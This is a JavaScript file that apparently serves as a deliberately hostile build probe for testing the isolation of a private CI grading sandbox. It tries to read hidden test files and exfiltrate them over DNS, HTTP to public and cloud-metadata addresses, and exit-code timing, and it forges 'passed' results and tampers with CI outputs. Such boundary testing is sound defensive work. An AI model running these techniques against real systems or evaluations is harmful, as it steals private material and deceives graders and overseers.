/**
 * Disposable hostile-PR probe for the private CI go-live gate.
 *
 * This deliberately attempts raw filesystem, environment, network, output,
 * cache, and artifact channels from the real production-build entry point.
 */
// allow-direct-file-io: this adversarial boundary probe must attack raw guest and CI paths directly
// allow-direct-env: this adversarial boundary probe must inspect raw CI variables for leaked capabilities

import dns from 'node:dns/promises';
import fs from 'node:fs';
import net from 'node:net';
import path from 'node:path';

const privateCandidates = [
    '/private-suite/web/tests/web_identity.py',
    '/work/private-suite/web/tests/web_identity.py',
    '/github/workspace/private-suite/web/tests/web_identity.py',
    '/home/runner/work/sloptank-tests/sloptank-tests/web/tests/web_identity.py',
    '/private-suite/server/tests/blackbox/server_identity.py',
    '/work/private-suite/server/tests/blackbox/server_identity.py',
    '/github/workspace/private-suite/server/tests/blackbox/server_identity.py',
    path.resolve('../private-suite/web/tests/web_identity.py'),
    path.resolve('../../private-suite/web/tests/web_identity.py'),
    path.resolve('../private-suite/server/tests/blackbox/server_identity.py'),
    path.resolve('../../private-suite/server/tests/blackbox/server_identity.py')
];

const privatePath = privateCandidates.find(candidate => fs.existsSync(candidate));
const privateMaterial = privatePath ? fs.readFileSync(privatePath, 'utf8').slice(0, 512) : '';
const probePayload = privateMaterial || 'NO_PRIVATE_MATERIAL_VISIBLE';
const encodedPayload = Buffer.from(probePayload).toString('hex').slice(0, 48);
const guestAgentPath = '/dev/virtio-ports/org.qemu.guest_agent.0';
const insideQemuGuest = fs.existsSync(guestAgentPath);
const proxyAvailable = insideQemuGuest && [
    'HTTP_PROXY',
    'HTTPS_PROXY',
    'ALL_PROXY',
    'http_proxy',
    'https_proxy',
    'all_proxy'
].some(variableName => Boolean(process.env[variableName]));

process.stdout.write(`HOSTILE_STDOUT:${probePayload}\n`);
process.stderr.write(`HOSTILE_STDERR:${probePayload}\n`);
process.stdout.write('::notice title=HOSTILE_WORKFLOW_COMMAND::FORGED_RESULT=passed\n');
process.stdout.write('{"result":"passed","feedback":null,"forged":true}\n');

function writeCiChannel(variableName, fallbackPath) {
    const destination = process.env[variableName] || fallbackPath;
    if (destination && fs.existsSync(destination)) {
        try {
            fs.appendFileSync(destination, `HOSTILE_${variableName}:${probePayload}\n`);
            return true;
        } catch (error) {
            process.stderr.write(`HOSTILE_${variableName}_BLOCKED:${String(error)}\n`);
        }
    }
    return false;
}

function tryWriteProbe(destination, contents) {
    try {
        fs.writeFileSync(destination, contents);
        return true;
    } catch (error) {
        process.stderr.write(`HOSTILE_WRITE_BLOCKED:${destination}:${String(error)}\n`);
        return false;
    }
}

function connect(host, port, family, payload) {
    // eslint-disable-next-line compat/compat -- This Node-only build probe never ships to supported browsers.
    return new Promise(resolve => {
        const socket = net.createConnection({ host, port, family });
        socket.setTimeout(750);
        socket.once('connect', () => {
            socket.write(payload);
            socket.destroy();
            resolve(true);
        });
        socket.once('timeout', () => {
            socket.destroy();
            resolve(false);
        });
        socket.once('error', () => resolve(false));
    });
}

const stepSummaryAvailable = insideQemuGuest
    && writeCiChannel('GITHUB_STEP_SUMMARY', '/github/step-summary.md');
const githubOutputAvailable = insideQemuGuest
    && writeCiChannel('GITHUB_OUTPUT', '/github/output');
const cacheAvailable = insideQemuGuest
    && writeCiChannel('ACTIONS_CACHE_URL', '/home/runner/work/_temp/cache-leak');
const artifactAvailable = insideQemuGuest
    && writeCiChannel('RUNNER_TEMP', '/github/artifact-leak');
const priorCacheVisible = fs.existsSync('/home/builder/.npm/sloptank-hostile-prior-run');
tryWriteProbe('/home/builder/.npm/sloptank-hostile-prior-run', probePayload);
const guestAgentWritable = insideQemuGuest
    && tryWriteProbe(guestAgentPath, '{"execute":"guest-shutdown"}\n');
// eslint-disable-next-line sonarjs/publicly-writable-directories -- Forging a guest-local result in /tmp is an explicit hostile boundary test.
tryWriteProbe('/tmp/private-ci-result.json', '{"result":"passed","feedback":null}\n');
tryWriteProbe('/work/private-ci-result.json', '{"result":"passed","feedback":null}\n');
const dnsAvailable = insideQemuGuest
    && await dns.resolve4(`${encodedPayload}.hostile-ci.invalid`).then(
        addresses => addresses.length > 0,
        () => false
    );
// eslint-disable-next-line sonarjs/no-hardcoded-ip -- This fixed public endpoint tests IPv4 egress from the disposable guest.
const ipv4ProbeHost = '1.1.1.1';
// eslint-disable-next-line sonarjs/no-hardcoded-ip -- This fixed public endpoint tests IPv6 egress from the disposable guest.
const ipv6ProbeHost = '2606:4700:4700::1111';
// eslint-disable-next-line sonarjs/no-hardcoded-ip -- The link-local metadata address is the attack target under test.
const metadataProbeHost = '169.254.169.254';
const ipv4Available = insideQemuGuest
    && await connect(ipv4ProbeHost, 80, 4, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);
const ipv6Available = insideQemuGuest
    && await connect(ipv6ProbeHost, 80, 6, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);
const metadataAvailable = insideQemuGuest
    && await connect(metadataProbeHost, 80, 4, `GET /${encodedPayload} HTTP/1.0\r\n\r\n`);

const manifest = JSON.parse(fs.readFileSync('src/manifest.json', 'utf8'));
manifest.name = 'HOSTILE SUITE TAMPER MUST NOT PASS';
fs.writeFileSync('src/manifest.json', `${JSON.stringify(manifest, null, 4)}\n`);

if (privateMaterial) {
    const timingBit = privateMaterial.charCodeAt(0) & 1;
    await new Promise(resolve => setTimeout(resolve, timingBit ? 4000 : 1000));
    process.exitCode = 80 + timingBit;
}

if (
    stepSummaryAvailable
    || githubOutputAvailable
    || cacheAvailable
    || artifactAvailable
    || proxyAvailable
    || guestAgentWritable
    || priorCacheVisible
) {
    process.exitCode = 91;
}

if (dnsAvailable || metadataAvailable) {
    process.exitCode = 92;
}

// Build-VM internet is expected for dependency restore. It is safe only because
// privateMaterial is absent; raw status remains trapped inside the guest protocol.
process.stderr.write(`HOSTILE_BUILD_NETWORK:${ipv4Available}:${ipv6Available}\n`);
